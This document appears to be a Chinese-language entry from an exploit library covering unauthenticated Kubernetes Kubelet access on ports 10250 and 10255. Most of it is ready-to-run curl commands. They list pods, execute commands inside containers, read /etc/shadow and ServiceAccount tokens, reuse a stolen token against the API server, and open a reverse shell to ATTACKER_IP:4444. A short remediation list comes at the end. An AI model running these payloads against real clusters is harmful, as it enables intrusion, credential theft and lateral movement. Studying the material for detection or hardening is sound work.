---
id: K8S-KUBELET-UNAUTH
title: Kubernetes Kubelet 未授权访问RCE
product: kubernetes
vendor: CNCF
version_affected: "all versions"
severity: CRITICAL
tags: [k8s, container, rce, 云原生, 无需认证]
fingerprint: ["Kubernetes", "kubelet", "k8s", ":10250", ":10255"]
---

## 漏洞描述

Kubelet是K8s节点上的代理组件，提供API用于管理Pod。默认端口10250（HTTPS）和10255（HTTP只读）。如果Kubelet配置了`--anonymous-auth=true`或缺少proper认证，攻击者可在任意Pod中执行命令。

## 影响版本

- Kubernetes 全版本（配置不当时）

## 前置条件

- 目标开放 10250 端口（HTTPS读写）或 10255 端口（HTTP只读）
- Kubelet 配置 `--anonymous-auth=true` 或缺少认证
- 无需认证凭据

## 利用步骤

### Step 1: 探测Kubelet

```bash
# 只读端口（信息泄露）
curl -s http://target:10255/pods
curl -s http://target:10255/metrics

# 读写端口
curl -sk https://target:10250/pods
```

### Step 2: 列出节点上的所有Pod

```bash
curl -sk https://target:10250/pods | python3 -m json.tool | grep -E '"name"|"namespace"'
```

### Step 3: 在Pod中执行命令

```bash
# 格式: /run/<namespace>/<pod>/<container>
curl -sk https://target:10250/run/default/POD_NAME/CONTAINER_NAME \
  -d "cmd=id"

curl -sk https://target:10250/run/default/POD_NAME/CONTAINER_NAME \
  -d "cmd=cat /etc/shadow"

curl -sk https://target:10250/run/default/POD_NAME/CONTAINER_NAME \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```

### Step 4: 获取ServiceAccount Token用于横向

```bash
TOKEN=$(curl -sk https://target:10250/run/default/POD_NAME/CONTAINER_NAME \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token")

# 利用token访问API Server
curl -sk -H "Authorization: Bearer $TOKEN" https://API_SERVER:6443/api/v1/namespaces
```

### Step 5: 反弹Shell

```bash
curl -sk https://target:10250/run/kube-system/SYSTEM_POD/CONTAINER \
  -d "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
```

## Payload

```bash
# 列出所有Pod
curl -sk https://target:10250/pods

# 在指定Pod中执行命令（替换NAMESPACE/POD_NAME/CONTAINER_NAME）
curl -sk https://target:10250/run/default/POD_NAME/CONTAINER_NAME \
  -d "cmd=id"

# 获取ServiceAccount Token
curl -sk https://target:10250/run/default/POD_NAME/CONTAINER_NAME \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```

## 验证方法

```bash
# 未授权读取：响应体是 PodList JSON，items 元素带 metadata.name、metadata.namespace、spec.containers
curl -sk https://target:10250/pods
# 反例：401/403，或 {"kind":"Status","reason":"Unauthorized"} → 已启用认证

curl -s http://target:10255/pods
# 只读端口判据同上，能解析出 PodList JSON 才算开放，404/403 不算

# 命令执行：用上一条读到的 pod/namespace/container，打一条带本次标记的无损命令
curl -sk https://target:10250/run/default/POD_NAME/CONTAINER_NAME -d "cmd=echo POC_TOKEN"
# 判据：响应体出现 POC_TOKEN（原始输出，非 JSON 包装）
# 反例：{"kind":"Status","reason":"NotFound"} 或 {"message":"exec: ... not found"}
# 拿到回显后再证明可读 root:x:0:0（/etc/passwd）与 ServiceAccount token
```

## 指纹确认

```bash
curl -sk https://target:10250/healthz
curl -s http://target:10255/healthz
nmap -p 10250,10255 target
```

## 修复建议

1. 设置 `--anonymous-auth=false`
2. 启用Webhook认证（`--authentication-token-webhook=true`）
3. 防火墙限制10250/10255端口
4. 禁用只读端口（`--read-only-port=0`）
